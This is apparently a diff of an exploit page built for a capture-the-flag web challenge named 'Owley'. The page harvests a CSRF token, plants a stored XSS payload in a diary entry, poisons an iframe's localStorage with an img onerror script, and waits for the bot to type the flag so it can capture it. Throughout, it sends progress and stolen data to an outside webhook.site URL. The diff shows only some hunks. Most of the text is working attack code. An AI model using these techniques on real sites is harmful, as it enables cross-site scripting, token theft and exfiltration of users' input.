@@ -1,26 +1,35 @@
 <!DOCTYPE html>
 <html>
-<head><title>Owley Exploit</title></head>
+<head><title>Bot Debugger</title></head>
 <body>
-    <!-- 1. The Dummy Form for the CSRF script -->
     <form id="csrf_target_form"></form>
 
     <script>
         const W = "https://webhook.site/6ef9bff5-8aaa-4fc4-8a76-743310ff8782";
+        
+        // TRIPWIRE 1: Catch hidden JavaScript errors
+        window.onerror = function(message, source, lineno, colno, error) {
+            new Image().src = W + "/?bot_error=" + btoa(message + " at line " + lineno);
+        };
+
+        // TRIPWIRE 2: Catch the bot closing the page early
+        window.addEventListener("beforeunload", function (e) {
+            new Image().src = W + "/?bot_leaving_page_early";
+        });
+
         new Image().src = W + "/?step=1_github_started";
     </script>
 
-    <!-- 2. The Token Stealer -->
+    <!-- The Token Stealer -->
     <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>
 
     <script>
         (function() {
             let attempts = 0;
-            const maxAttempts = 50; // Poll for 5 seconds
+            const maxAttempts = 50; 
 
             const tokenHunter = setInterval(() => {
                 attempts++;
-                
                 const tokenInput = document.querySelector('input[name="csrfmiddlewaretoken"]');
                 
                 if (tokenInput && tokenInput.value) {
@@ -32,21 +41,16 @@
                     clearInterval(tokenHunter);
                     new Image().src = W + "/?step=error_timeout_no_token";
                 }
-            }, 100);
+            }, 50); // Sped up to 50ms to beat impatient bots
 
             function executePayload(token) {
-                // 3. The core logic that runs inside the bot's Diary.
                 const innerJS = `
                     document.domain='owley-madison.jeopardy.websec.saarland';
                     new Image().src='${W}/?step=4_diary_xss_firing';
-                    
                     var i=document.createElement('iframe');
                     i.src='https://match.owley-madison.jeopardy.websec.saarland/';
-                    
                     i.onload=function(){
                         new Image().src='${W}/?step=5_iframe_ready';
-                        
-                        // THE TRAP: Waits for the bot to type the flag into the message box
                         var trap = "var wait=setInterval(function(){" +
                                    "  var m=parent.document.getElementById('message');" +
                                    "  if(m && m.value.length > 5){" + 
@@ -54,9 +58,7 @@
                                    "    clearInterval(wait);" +
                                    "  }" +
                                    "}, 500);";
-
                         var p = '</option><img src=x onerror="' + trap + '">';
-                        
                         i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));
                         new Image().src='${W}/?step=6_poisoned_redirecting';
                         window.location.href='https://chat.owley-madison.jeopardy.websec.saarland/';
@@ -64,14 +66,12 @@
                     document.body.appendChild(i);
                 `;
 
-                // Base64 encode innerJS to prevent any quotation mark conflicts inside the HTML attribute
                 const encodedJS = btoa(innerJS);
                 const diaryEntry = '<img src="x" onerror="eval(atob(\\'' + encodedJS + '\\'))">';
 
                 const form = document.createElement('form');
                 form.action = 'https://diary.owley-madison.jeopardy.websec.saarland/entry';
                 form.method = 'POST';
-                
                 form.innerHTML = '<input name="content" id="c"><input name="csrfmiddlewaretoken" id="t">';
                 document.body.appendChild(form);
                 
